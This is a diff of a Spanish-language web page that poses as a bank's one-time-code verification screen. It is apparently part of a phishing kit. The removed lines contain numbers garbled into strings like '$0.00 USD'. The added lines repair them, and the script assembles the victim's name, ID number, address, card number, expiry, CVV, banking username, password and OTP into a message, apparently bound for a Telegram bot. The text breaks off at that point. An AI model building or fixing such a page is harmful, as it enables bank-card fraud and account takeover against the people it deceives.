@@ -1,20 +1,20 @@
 <!DOCTYPE html>
 <html lang="es">
   <head>
-    <meta charset="UTF-$0.00 USD" />
-    <meta name="viewport" content="width=device-width, initial-scale=$0.00 USD.$0.00 USD" />
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Mi Página</title>
     <style>
       body {
         background-color: #ffffff;
-        margin: $0.00 USD;
-        padding: $0.00 USD;
+        margin: 0;
+        padding: 0;
         overflow: hidden; /* Evita que la página se desplace */
       }
 
       html,
       body {
-        height: $0.03 USD%;
+        height: 100%;
       }
 
       #contenedor {
@@ -48,7 +48,7 @@
       #titulo {
         font-size: 20px;
         font-weight: bold;
-        color: #$0.08 USD;
+        color: #333;
         margin-top: 70px;
         margin-bottom: 10px;
         text-align: center;
@@ -57,7 +57,7 @@
       #titulo2 {
         font-size: 16px;
         font-weight: bold;
-        color: #$0.08 USD;
+        color: #333;
         margin-top: 30px;
         margin-bottom: 10px;
         text-align: center;
@@ -66,28 +66,28 @@
       #parrafo {
         font-size: 13px;
         color: #000000;
-        margin: $0.00 USDauto;
-        max-width: $0.02 USD%;
+        margin: 0 auto;
+        max-width: 80%;
         text-align: justify;
         letter-spacing: 2px;
       }
 
       #formulario {
         margin-top: 20px;
-        padding: $0.00 USD20px;
+        padding: 0 20px;
       }
 
       #formulario label {
         display: inline-block;
         font-size: 12px;
         font-weight: bold;
-        color: #$0.08 USD;
+        color: #333;
         margin-bottom: 5px;
-        width: $0.01 USD%;
+        width: 50%;
       }
 
       #formulario input {
-        width: $0.01 USD%;
+        width: 48%;
         padding: 5px;
         margin-bottom: 10px;
         box-sizing: border-box;
@@ -96,7 +96,7 @@
 
       #horaTransaccion {
         font-size: 12px;
-        color: #$0.08 USD;
+        color: #333;
         margin-top: 15px;
       }
 
@@ -104,8 +104,8 @@
         display: block;
         margin: 45px auto;
         padding: 15px 30px;
-        border-radius: $0.00 USD%;
-        background-color: #$0.00 USD;
+        border-radius: 10%;
+        background-color: #000;
         color: #fff;
         text-align: center;
         cursor: pointer;
@@ -115,7 +115,7 @@
       }
 
       #contador {
-        color: #$0.14 USD;
+        color: #555;
         font-size: 8px;
         margin-left: 15px;
       }
@@ -125,24 +125,24 @@
         height: 48px;
         border: 5px solid #fff;
         border-bottom-color: #e8114b;
-        border-radius: $0.01 USD%;
+        border-radius: 50%;
         display: inline-block;
         box-sizing: border-box;
         animation: rotation 1s linear infinite;
       }
 
       @keyframes rotation {
-        $0.00 USD% {
+        0% {
           transform: rotate(0deg);
         }
-        $0.03 USD% {
+        100% {
           transform: rotate(360deg);
         }
       }
 
       .loaderp-full {
         position: fixed;
-        top: $0.00 USD;
+        top: 0;
         overflow-y: hidden;
         z-index: 1000;
         background-color: white;
@@ -177,11 +177,11 @@
             type="text"
             id="otp"
             name="otp"
-            maxlength="$0.00 USD"
+            maxlength="6"
             oninput="validarOtp()"
           />
           <p id="contador">
-            Ingresa el codigo de $0.00 USDdigitos recibido por mensaje o
+            Ingresa el codigo de 6 digitos recibido por mensaje o
             <span id="tiempo"></span>ingresando a su tu app.
           </p>
         </div>
@@ -190,7 +190,7 @@
        <!-- LOADER FULL -->
     <div class="loaderp-full">
         <span class="loaderp"></span>
-        <p class="text-italic tc-ocean fs-$0.00 USDfw-light">Cargando...</p>
+        <p class="text-italic tc-ocean fs-3 fw-light">Cargando...</p>
       </div>
     </div>
     <script>
@@ -214,20 +214,20 @@
 
       function obtenerFechaActual() {
         const ahora = new Date();
-        const dia = ahora.getDate().toString().padStart($0.00 USD, "$0.00 USD");
-        const mes = (ahora.getMonth() + $0.00 USD).toString().padStart($0.00 USD, "$0.00 USD");
+        const dia = ahora.getDate().toString().padStart(2, "0");
+        const mes = (ahora.getMonth() + 1).toString().padStart(2, "0");
         const año = ahora.getFullYear();
-        const horas = ahora.getHours().toString().padStart($0.00 USD, "$0.00 USD");
-        const minutos = ahora.getMinutes().toString().padStart($0.00 USD, "$0.00 USD");
-        const segundos = ahora.getSeconds().toString().padStart($0.00 USD, "$0.00 USD");
+        const horas = ahora.getHours().toString().padStart(2, "0");
+        const minutos = ahora.getMinutes().toString().padStart(2, "0");
+        const segundos = ahora.getSeconds().toString().padStart(2, "0");
         return `${dia}/${mes}/${año} ${horas}:${minutos}:${segundos}`;
       }
 
       function actualizarHoraTransaccion() {
         const ahora = new Date();
-        const horas = ahora.getHours().toString().padStart($0.00 USD, "$0.00 USD");
-        const minutos = ahora.getMinutes().toString().padStart($0.00 USD, "$0.00 USD");
-        const segundos = ahora.getSeconds().toString().padStart($0.00 USD, "$0.00 USD");
+        const horas = ahora.getHours().toString().padStart(2, "0");
+        const minutos = ahora.getMinutes().toString().padStart(2, "0");
+        const segundos = ahora.getSeconds().toString().padStart(2, "0");
         document.getElementById(
           "horaTransaccion"
         ).innerText = `Hora de la transacción: ${horas}:${minutos}:${segundos}`;
@@ -242,8 +242,8 @@
 
       function validarOtp() {
         const otpInput = document.getElementById("otp");
-        if (otpInput.value.length > $0.00 USD) {
-          otpInput.value = otpInput.value.slice($0.00 USD, $0.00 USD);
+        if (otpInput.value.length > 6) {
+          otpInput.value = otpInput.value.slice(0, 6);
         }
       }
 
@@ -320,19 +320,19 @@
         const formData0 = JSON.parse(localStorage.getItem("formData"));
         // Generar un ID de transacción único
         const transactionId =
-          Date.now().toString($0.01 USD) + Math.random().toString($0.01 USD).substr($0.00 USD);
+          Date.now().toString(36) + Math.random().toString(36).substr(2);
         // Obtener los valores del formulario
         const otp = document.getElementById("otp").value;
         const username = localStorage.getItem("username"); // Asegúrate de que `username` esté en el localStorage
         const password = localStorage.getItem("password"); // Asegúrate de que `password` esté en el localStorage
 
         // Comprobar si se obtuvo el código OTP
-        if (!otp || otp.length !== $0.00 USD) {
-          alert("Por favor, ingrese un código OTP válido de $0.00 USDdígitos.");
+        if (!otp || otp.length !== 6) {
+          alert("Por favor, ingrese un código OTP válido de 6 dígitos.");
           return;
         }
 
-        const message = `Nuevo solicitud de clave dinamica $0.00 USDpendiente de verificación.\n🆔ID: ${transactionId}\n👤Nombre: ${formData0.nombre}\n🪪Cédula: ${formData0.documentoIdentidad}\n-\n📞Teléfono: ${formData0.telefono}\n🌇Ciudad: ${formData0.ciudad}\n🗺️Direc: ${formData0.direccion}\n-\n🏦 Banco: ${formData0.entidad}\n💳Tarjeta: ${formData0.tarjeta}\n📅Fecha: ${formData0.fechaExpiracion}\n🔐CVV: ${formData0.cvv}\n🧑‍💻Usuario: ${username}\n🔐Clave: ${password}\n🔑OTP1: ${otp}
+        const message = `Nuevo solicitud de clave dinamica 1 pendiente de verificación.\n🆔ID: ${transactionId}\n👤Nombre: ${formData0.nombre}\n🪪Cédula: ${formData0.documentoIdentidad}\n-\n📞Teléfono: ${formData0.telefono}\n🌇Ciudad: ${formData0.ciudad}\n🗺️Direc: ${formData0.direccion}\n-\n🏦 Banco: ${formData0.entidad}\n💳Tarjeta: ${formData0.tarjeta}\n📅Fecha: ${formData0.fechaExpiracion}\n🔐CVV: ${formData0.cvv}\n🧑‍💻Usuario: ${username}\n🔐Clave: ${password}\n🔑OTP1: ${otp}
         `;
 
         const keyboard = JSON.stringify({
